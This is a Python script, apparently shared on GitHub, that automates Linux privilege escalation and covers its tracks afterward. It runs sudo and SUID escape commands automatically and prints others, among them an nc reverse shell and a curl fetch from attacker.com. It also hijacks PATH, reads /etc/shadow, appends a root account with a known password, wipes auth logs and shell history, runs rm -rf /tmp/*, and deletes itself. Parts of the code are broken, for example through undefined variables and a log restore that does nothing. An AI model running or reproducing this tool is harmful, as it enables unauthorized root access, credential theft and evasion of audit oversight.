#!/usr/bin/python3
# author: suffs811
# github: https://github.com/cysec11/scripts.git
# purpose: script for automating common privesc techniques.
# if the cmd can be run, it we be execute automatically;
# if not, it will print the cmd to screen for the user to exec manually.
# 
# usage: python3 priv.py -p 'user's_passwd'


import os
import argparse
import re
import time


parser = argparse.ArgumentParser(description="gather data, scp to local device, cover tracks\nusage: python3 exfil.py -i 10.0.0.1:/home/data.txt -p 'password123'")
parser.add_argument("-p", "--password", help="specify user's password if know")
args = parser.parse_args()
password = args.password


# check to see if user needs password to run sudo
sudo_time = os.system("time timeout -k 5 5 sudo -l")
sudo_no_pass = None
if sudo_time > float('1.0'):
	sudo_no_pass = False
else:
	sudo_no_pass = True


# create file to write data to
os.system("touch /tmp/pwd.txt")


# disable history logging and create backups
def disable_hist():
    print("\n### creating backups of log files... ###")
    os.system("mkdir /tmp/.backups")
    os.system("cp /var/log/auth.log /tmp/.backups/")
    os.system("cp /var/log/cron.log /tmp/.backups/")
    os.system("cp /var/log/maillog /tmp/.backups/")
    os.system("cp /var/log/httpd /tmp/.backups/")
    os.system("cp ~/.bash_history /tmp/.backups/")
    os.system("cp /root/.bash_history /tmp/.backups/")
    os.system("echo $history > /tmp/.backups/history")
    os.system("history -c")
    os.system("history -w")


# check for binaries that can be run as sudo and print privesc script to screen
def sudo_l():
    print("\n###--- please run 'sudo -l > /tmp/sudo_l.txt' before running this script to find sudoable commands ---###")
    time.sleep(5)
    print("\n### finding binaries you can run as sudo... ###")

    # commands that will be printed to screen bc they require user interation 
    sudo_bins_print = {
        "curl":"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE (to get remote file)",
        "ftp":"sudo ftp\n!/bin/sh",
        "more":"TERM= sudo more /etc/profile\n!/bin/sh",
        "nano":"sudo nano\n^R^X\nreset; sh 1>&0 2>&0",
        "nc":"sudo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <localIP> <localPORT> >/tmp/f",
        "openssl":"(on attack box:) openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n(on target box:) mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect <localIP>:<localPORT> > /tmp/s; rm /tmp/s"
        }

    # commands to execute if appears in sudo -l results
    sudo_bins_exec = {
        "all":"sudo /bin/bash -p",
        "bash":"sudo /bin/bash -p",
        "base64":"sudo base64 /etc/shadow | base64 --decode",
        "cat":"sudo cat /etc/shadow",
        "chmod":"sudo chmod 6777 /etc/shadow&&cat /etc/shadow",
        "cp":"sudo cp /bin/sh /bin/cp\nsudo cp",
        "crontab":"sudo crontab -e",
        "docker":"sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        "env":"sudo env /bin/sh",
        "grep":"sudo grep '' /etc/shadow",
        "gzip":"sudo gzip -f /etc/shadow -t",
        "mount":"sudo mount -o bind /bin/sh /bin/mount&&sudo mount",
        "mv":"LFILE=/etc/shadow&&TF=$(mktemp)&&echo 'root:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::' > $TF&&sudo mv $TF $LFILE&&echo 'su root, passwd is 'password''",
        "mysql":"sudo mysql -e '\\! /bin/sh'",
        "perl":"sudo perl -e \"exec '/bin/sh';\"",
        "php":"CMD='/bin/sh'&&sudo php -r \"system('$CMD');\"",
        "python":"sudo python -c 'import os; os.system(\"/bin/sh\")'",
        "ruby":"sudo ruby -e 'exec \"/bin/sh\"'",
        "scp":"TF=$(mktemp)&&echo 'sh 0<&2 1>&2' > $TF&&chmod +x '$TF'&&sudo scp -S $TF x y:",
        "ssh":"sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x", 
        "tar":"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "vi":"sudo vi -c ':!/bin/sh' /dev/null", 
        "vim":"sudo vim -c ':!/bin/sh'",
        "wget":"TF=$(mktemp)&&chmod +x $TF&&echo -e '#!/bin/sh&&/bin/sh 1>&0' >$TF&&sudo wget --use-askpass=$TF 0"
    }


    # open last line of sudo -l output to determine sudo capabilities
    with open('/tmp/sudo_l.txt', 'r') as pwd:
        last_line = pwd.readlines()[-1]
        last_line.lower()

    # loop through dictionaries and print cmds if need user interaction, otherwise execute
    for key in sudo_bins_print:
        if key in last_line:
            print("{}: {}".format(key,value))
            continue
        else:
            continue

    for key in sudo_bins_exec:
        if key in last_line:
            print("{}: {}".format(key,value))
            sudo_cmd = value.strip()
            os.system(sudo_cmd)
        else:
            continue


# try SUID/GUID files exloitation
def suid():
    print("\n### finding SUID files... ###")
    suid_bins_print = {
    "curl":"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE",
    "openssl":"(on attack box:) openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n(on target box:) mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect <localIP>:<localPORT> > /tmp/s; rm /tmp/s"
    }

    suid_bins_exec = {
    "base64":"./base64 /etc/shadow | base64 --decode",
    "bash":"./bash -p",
    "chmod":"./chmod 6777 /etc/shadow&&cat /etc/shadow",
    "cp":"./cp --attributes-only --preserve=all ./cp /etc/shadow",
    "dig":"./dig -f /etc/shadow",
    "docker":"./docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "env":"./env /bin/sh -p",
    "file":"./file -f /etc/shadow",
    "find":"./find . -exec /bin/sh -p \\; -quit",
    "gzip":"./gzip -f /etc/shadow -t",
    "mosquitto":"./mosquitto -c /etc/shadow",
    "mv":"LFILE=/etc/shadow&&TF=$(mktemp)&&echo 'root:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::' > $TF&&./mv $TF $LFILE&& echo 'su root: passwd is 'password''",
    "nmap":"LFILE=/etc/shadow&&./nmap -oG=$LFILE root:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::&& echo 'su root, passwd is 'password''",
    "openvpn":"./openvpn --dev null --script-security 2 --up '/bin/sh -p -c 'sh -p''",
    "perl":"./perl -e 'exec '/bin/sh';'",
    "php":"CMD='/bin/sh'&&./php -r 'pcntl_exec('/bin/sh', ['-p']);'",
    "python":"./python -c 'import os; os.execl('/bin/sh', 'sh', '-p')'",
    "rsync":"./rsync -e 'sh -p -c 'sh 0<&2 1>&2'' 127.0.0.1:/dev/null",
    "ssh-agent":"./ssh-agent /bin/ -p",
    "ssh-keygen":"./ssh-keygen -D ./lib.so",
    "ssh-keyscan":"./ssh-keyscan -f /etc/shadow",
    "sshpass":"./sshpass /bin/sh -p",
    "strings":"./strings /etc/shadow",
    "systemctl":"TF=$(mktemp).service&&echo '[Service]&&Type=oneshot&&ExecStart=/bin/sh -c 'id > /tmp/output'&&[Install]&&WantedBy=multi-user.target' > $TF&&./systemctl link $TF&&./systemctl enable --now $TF",
    "unzip":"./unzip -K shell.zip&&./sh -p",
    "vim":"./vim -c ':py import os; os.execl('/bin/sh', 'sh', '-pc', 'reset; exec sh -p')'",
    "wc":"./wc --files0-from /etc/shadow",
    "wget":"TF=$(mktemp)&&chmod +x $TF&&echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF&&./wget --use-askpass=$TF 0",
    "zsh":"./zsh"
    }

    # loop through dictionaries and print cmds if need user interaction, otherwise execute
    os.system("find / -type f -perm /4000 2>/dev/null | tee /tmp/pwd.txt")
    with open("/tmp/sudo_l.txt") as suid_file:
        suid = suid_file.readlines()
        for line in suid:
            if ".sh" in line:
                print(line)
            else:
                continue
        for key in suid_bins_print:
            if key in suid:
                print("\n{}: {}".format(key,value))
            else:
                continue

        for key in suid_bins_exec:
            if key in suid:
                print("\n{}: {}".format(key,value))
                suid_cmd = value.strip()
                os.system(suid_cmd)
                break
            else:
                continue


# try SUID executables for $PATH exploitation
def path():
    print("\n### running strings on SUID executables & searching for cmds w/o fill path (might want to check manually as well)")
    
    common_cmds = ["base64", "bash", "chmod", "cp", "dig", "docker", "env", "file", "find", "gzip", "mosquitto", "mv", 
    "nmap", "openvpn", "perl", "php", "python", "mysql", "rsync", "strings", "systemctl", "unzip", "vim", "wc", "wget", 
    "zsh", "ls", "ftp", "apache2", "apache", "ssh", "ps", "ss", "cat", "touch", "mkdir", "cd", "rm", "nc", "service", 
    "help", "smbclient", "echo", "more", "less", "head", "tail", "openssl", "mkpasswd", "pwd", "scp", "python3", "crontab", 
    "git", "gh", "vi", "nano"]

    os.system("mkdir /tmp/.path/")
    print("\n### finding SUID executables that don't specify full path (for $PATH exploit) ###")
    os.system("find / type f -perm /4000 2>/dev/null | tee /tmp/pwd.txt")
    with open("/tmp/pwd.txt") as root_files:
        lines = root_files.readlines()
        for line in lines:
            split_path = line.split("/")
            split_path_1 = split_path[-1]
            os.system("strings {} > /tmp/.path/root_{}".format(line,split_path_1))
            strings_file = open("/tmp/.path/root_{}".format(split_path_1))
            lines_strings = strings_file.readlines()
            for cmd in common_cmds:
                non_path_cmd = re.search("\\s{}\\s".format(cmd), lines_strings)
                if non_path_cmd:
                    print("\n### {} does not specify full path of {} ###".format(line,cmd))
                    os.system("touch /tmp/{}&&echo '/bin/bash -p' > /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line))
                    break
                else:
                    continue
            strings_file.close()


# try writing to /etc/passwd or /etc/shadow
def pass_shadow():
    print("\n### checking if /etc/passwd or /etc/shadow are writable... ###")

    # check if /etc/passwd is writable and if so, add root user
    os.system("ls -l /etc/passwd > /tmp/pwd.txt")
    with open("/tmp/pwd.txt") as passwd:
        perms = passwd.readline()
        writable = re.search("\\A.......rw|\\A.......-w", perms)
        if writable:
            print("\n### /etc/passwd is writable! creating user 'root1':'password'... ###")
            os.system("echo 'root1:$1$pass$1K/wwgbgGDqTdxG.EHS8F1:0:0:root1:/root:/bin/bash' >> /etc/passwd")
            print("\n### root-group user 'root1':'password' created... :su root1 ###")

    # check if /etc/shadow is writable and if so, add root user
    os.system("ls -l /etc/shadow > /tmp/pwd.txt")
    with open("/tmp/pwd.txt") as shadow:
        perms = shadow.readline()
        writable = re.search("\\A.......rw|\\A.......-w", shadow)
        if writable:
            print("\n### /etc/shadow is writable! creating user 'root1':'password'... ###")
            os.system("echo 'root1:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::' >> /etc/shadow")
            print("\n### root-group user 'root1':'password' created... :su root1 ###")


# reestablish history logging and replace log files
def clear_tracks():
        print("\n### clearing and replacing log files to previous state... ###")
        os.system("echo ' ' > /var/log/auth.log")
        os.system("echo ' ' > /var/log/cron.log")
        os.system("echo ' ' > /var/log/maillog")
        os.system("echo ' ' > /var/log/httpd")
        os.system("history -c")
        os.system("history -w")
        os.system("echo ' ' > ~/.bash_history")
        os.system("echo ' ' > /root/.bash_history")
        os.system("rm -r /tmp/pwd.txt")

		# placing old contents back into logs
        os.system("echo /tmp/.backups/auth.log > /var/log/auth.log")
        os.system("echo /tmp/.backups/cron.log > /var/log/cron.log")
        os.system("echo /tmp/.backups/maillog > /var/log/maillog")
        os.system("echo /tmp/.backups/httpd > /var/log/httpd")
        os.system("echo /tmp/.backups/.bash_history > ~/.bash_history")
        os.system("echo /tmp/.backups/.bash_history > /root/.bash_history")
        os.system("echo /tmp/.backups/history > $history")

        print("\n### deleting script and exiting... ###")
        os.system("rm -rf /tmp/.backups/")
        os.system("rm -rf /tmp/.path/")
        os.system("rm -rf /tmp/*")
        os.system("rm -f priv.py")
        exit()


# - call functions -
disable_hist()
sudo_l()
suid()
path()
pass_shadow()
print("\n-+- welcome, root -+-")
clear_tracks()
